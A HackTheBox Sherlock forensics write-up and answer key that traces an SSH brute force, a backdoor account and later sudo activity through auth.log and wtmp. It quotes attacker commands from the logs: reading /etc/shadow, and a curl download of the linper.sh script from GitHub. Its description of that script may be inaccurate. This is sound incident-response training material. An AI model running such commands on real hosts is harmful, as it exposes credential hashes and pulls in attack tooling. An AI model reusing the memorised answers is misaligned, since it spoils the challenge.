# Brutus — HackTheBox Sherlock Writeup

**Scenario:** A Confluence server was brute-forced via SSH. Using `auth.log` and `wtmp`, we trace the attacker's initial access, persistence, privilege escalation, and command execution.

**Artifacts:** `auth.log`, `wtmp`

---

## Task 1 — Attacker's IP Address

**Question:** What is the IP address used by the attacker to carry out a brute force attack?

**Answer:** `65.2.161.68`

**Analysis:** Reviewing `auth.log` for repeated failed SSH authentication attempts reveals a high volume of `Failed password` entries all originating from a single source IP — `65.2.161.68` — consistent with automated brute-force tooling targeting the SSH service.

---

## Task 2 — Compromised Account Username

**Question:** The brute-force attempts were successful. What is the username of the account?

**Answer:** `root`

**Analysis:** Following the stream of failed attempts from `65.2.161.68`, `auth.log` records an `Accepted password for root` entry from the same IP, confirming the attacker successfully guessed the `root` account credentials.

---

## Task 3 — Manual Login Timestamp (UTC)

**Question:** What is the UTC timestamp when the attacker manually logged in and established a terminal session?

**Answer:** `2024-03-06 07:37:35 UTC`

**Analysis:** While `auth.log` records the authentication event, the actual interactive session start time is tracked in the `wtmp` binary log. Parsing `wtmp` with `utmpdump` reveals the attacker's terminal session was established at `2024-03-06 07:37:35 UTC` — distinct from the earlier authentication timestamp.

---

## Task 4 — SSH Session Number

**Question:** What is the session number assigned to the attacker's session for the `root` account?

**Answer:** `37`

**Analysis:** Upon successful login, `sshd` and `systemd-logind` write a session number to `auth.log`. The log entry following the accepted login for `root` from `65.2.161.68` shows `pam_unix(sshd:session): session opened for user root` with session number `37`.

---

## Task 5 — Backdoor Account Name

**Question:** The attacker added a new user as part of their persistence strategy and gave it higher privileges. What is the name of this account?

**Answer:** `cyberjunkie`

**Analysis:** Within the attacker's active `root` session, `auth.log` records a `useradd` event creating the account `cyberjunkie` (UID=1002, GID=1002). Shortly after, the account is granted elevated privileges — the attacker's persistence mechanism to survive a potential `root` password reset.

---

## Task 6 — MITRE ATT&CK Sub-Technique

**Question:** What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

**Answer:** `T1136.001`

**Analysis:** Creating a local user account on a Unix/Linux system maps to **T1136.001 — Create Account: Local Account**. This is a classic persistence technique allowing an attacker to regain access via a backdoor account even if the initially compromised credentials are revoked.

---

## Task 7 — First SSH Session End Time

**Question:** What time did the attacker's first SSH session end according to `auth.log`?

**Answer:** `2024-03-06 08:37:24 UTC`

**Analysis:** `auth.log` records session closure via `pam_unix(sshd:session): session closed for user root`. The entry corresponding to session `37` shows the session terminated at `2024-03-06 08:37:24 UTC`, placing the attacker's first interactive session at approximately one hour in duration.

---

## Task 8 — Full sudo Command Executed

**Question:** The attacker logged into their backdoor account and used elevated privileges to download a script. What is the full command executed using sudo?

**Answer:**
```
/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

**Analysis:** After logging in as `cyberjunkie`, `auth.log` records two `sudo` invocations. The first dumps password hashes (`sudo /usr/bin/cat /etc/shadow`). The second — the answer to this task — downloads `linper.sh`, a well-known Linux privilege escalation enumeration script from GitHub, using the full command above.

---

## Summary Table

| Task | Answer |
|------|--------|
| 1 — Attacker IP | `65.2.161.68` |
| 2 — Compromised account | `root` |
| 3 — Manual login time (UTC) | `2024-03-06 07:37:35` |
| 4 — SSH session number | `37` |
| 5 — Backdoor account | `cyberjunkie` |
| 6 — MITRE sub-technique | `T1136.001` |
| 7 — Session end time (UTC) | `2024-03-06 08:37:24` |
| 8 — Full sudo command | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---

*Artifacts analyzed: `auth.log`, `wtmp` — HackTheBox Sherlock: Brutus*
